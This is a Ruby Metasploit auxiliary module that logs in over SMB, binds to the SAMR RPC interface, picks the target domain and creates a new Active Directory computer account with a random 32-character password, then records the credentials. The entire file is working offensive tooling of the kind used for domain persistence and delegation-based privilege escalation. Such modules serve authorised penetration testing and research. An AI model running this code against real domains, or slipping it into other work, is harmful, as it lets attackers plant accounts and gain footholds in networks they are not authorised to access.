##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'ruby_smb/dcerpc/client'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::SMB::Client::Authenticated
  include Msf::Exploit::Remote::DCERPC
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'SAMR Computer Management',
        'Description' => %q{
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Alberto Solino', # Original Impacket code # todo: verify this author credit
          'Spencer McIntyre',
        ],
        'References' => [
          ['URL', 'https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py'],
        ],
        'Notes' => {
          'Reliability' => [],
          'Stability' => [],
          'SideEffects' => [ IOC_IN_LOGS ]
        },
        'Actions' => [
          [ 'ADD_COMPUTER', { 'Description' => 'Add a computer account' } ],
        ],
        'DefaultAction' => 'ADD_COMPUTER'
      )
    )

    register_options([
      OptString.new('COMPUTER_NAME', [ false, 'The computer name' ]),
      Opt::RPORT(445)
    ])
  end

  def connect_samr
    vprint_status('Connecting to Security Account Manager (SAM) Remote Protocol')
    samr = @tree.open_file(filename: 'samr', write: true, read: true)

    vprint_status('Binding to \\samr...')
    samr.bind(endpoint: RubySMB::Dcerpc::Samr)
    vprint_good('Bound to \\samr')

    samr
  end

  def run
    connect
    begin
      smb_login
    rescue Rex::Proto::SMB::Exceptions::Error, RubySMB::Error::RubySMBError => e
      fail_with(Module::Failure::NoAccess, "Unable to authenticate ([#{e.class}] #{e}).")
    end
    report_service(
      host: rhost,
      port: rport,
      host_name: simple.client.default_name,
      proto: 'tcp',
      name: 'smb',
      info: "Module: #{fullname}, last negotiated version: SMBv#{simple.client.negotiated_smb_version} (dialect = #{simple.client.dialect})"
    )

    begin
      @tree = simple.client.tree_connect("\\\\#{sock.peerhost}\\IPC$")
    rescue RubySMB::Error::RubySMBError => e
      fail_with(Module::Failure::Unreachable, "Unable to connect to the remote IPC$ share ([#{e.class}] #{e}).")
    end

    @samr = connect_samr
    @server_handle = @samr.samr_connect

    if datastore['SMBDomain'].blank? || datastore['SMBDomain'] == '.'
      all_domains = @samr.samr_enumerate_domains_in_sam_server(server_handle: @server_handle).map(&:to_s).map(&:encode)
      all_domains.delete('Builtin')
      if all_domains.length == 0
        fail_with(Failure::NotFound, 'No domains were found on the SAM server.')
      elsif all_domains.length > 1
        print_status("Enumerated domains: #{all_domains.join(', ')}")
        fail_with(Failure::BadConfig, 'The SAM server has more than one domain, the target must be specified.')
      end

      @domain_name = all_domains.first
      print_status("Using automatically identified domain: #{@domain_name}")
    else
      @domain_name = datastore['SMBDomain']
    end

    @domain_sid = @samr.samr_lookup_domain(server_handle: @server_handle, name: @domain_name)
    @domain_handle = @samr.samr_open_domain(server_handle: @server_handle, domain_id: @domain_sid)
    send("action_#{action.name.downcase}")
  end

  def random_hostname(prefix: 'DESKTOP')
    "#{prefix}-#{Rex::Text.rand_base(8, '', ('A'..'Z').to_a + ('0'..'9').to_a)}$"
  end

  def action_add_computer
    if datastore['COMPUTER_NAME'].blank?
      computer_name = random_hostname
      4.downto(0) do |attempt|
        break if @samr.samr_lookup_names_in_domain(domain_handle: @domain_handle, names: [ computer_name ]).nil?

        computer_name = random_hostname
        fail_with(Failure::BadConfig, 'Could not find an unused computer name.') if attempt == 0
      end
    else
      computer_name = datastore['COMPUTER_NAME']
      if @samr.samr_lookup_names_in_domain(domain_handle: @domain_handle, names: [ computer_name ])
        fail_with(Failure::BadConfig, 'The specified computer name already exists.')
      end
    end

    result = @samr.samr_create_user2_in_domain(
      domain_handle: @domain_handle,
      name: computer_name,
      account_type: RubySMB::Dcerpc::Samr::USER_WORKSTATION_TRUST_ACCOUNT,
      desired_access: RubySMB::Dcerpc::Samr::USER_FORCE_PASSWORD_CHANGE | RubySMB::Dcerpc::Samr::MAXIMUM_ALLOWED
    )

    user_handle = result[:user_handle]
    password = Rex::Text.rand_text_alphanumeric(32)

    user_info = RubySMB::Dcerpc::Samr::SamprUserInfoBuffer.new(
      tag: RubySMB::Dcerpc::Samr::USER_INTERNAL4_INFORMATION_NEW,
      member: RubySMB::Dcerpc::Samr::SamprUserInternal4InformationNew.new(
        i1: {
          password_expired: 1,
          which_fields: RubySMB::Dcerpc::Samr::USER_ALL_NTPASSWORDPRESENT | RubySMB::Dcerpc::Samr::USER_ALL_PASSWORDEXPIRED
        },
        user_password: {
          buffer: RubySMB::Dcerpc::Samr::SamprEncryptedUserPasswordNew.encrypt_password(
            password,
            @simple.client.application_key.blank? ? @simple.client.session_key : @simple.client.application_key
          )
        }
      )
    )
    @samr.samr_set_information_user2(
      user_handle: user_handle,
      user_info: user_info
    )

    user_info = RubySMB::Dcerpc::Samr::SamprUserInfoBuffer.new(
      tag: RubySMB::Dcerpc::Samr::USER_CONTROL_INFORMATION,
      member: RubySMB::Dcerpc::Samr::UserControlInformation.new(
        user_account_control: RubySMB::Dcerpc::Samr::USER_WORKSTATION_TRUST_ACCOUNT
      )
    )
    @samr.samr_set_information_user2(
      user_handle: user_handle,
      user_info: user_info
    )
    print_good("Successfully created #{@domain_name}\\#{computer_name} with password #{password}")
    report_creds(@domain_name, computer_name, password)
  end

  def report_creds(domain, username, password)
    service_data = {
      address: datastore['RHOST'],
      port: datastore['RPORT'],
      service_name: 'smb',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      module_fullname: fullname,
      origin_type: :service,
      private_data: password,
      private_type: :password,
      username: username,
      realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
      realm_value: domain
    }.merge(service_data)

    credential_core = create_credential(credential_data)

    login_data = {
      core: credential_core,
      status: Metasploit::Model::Login::Status::UNTRIED
    }.merge(service_data)

    create_credential_login(login_data)
  end
end
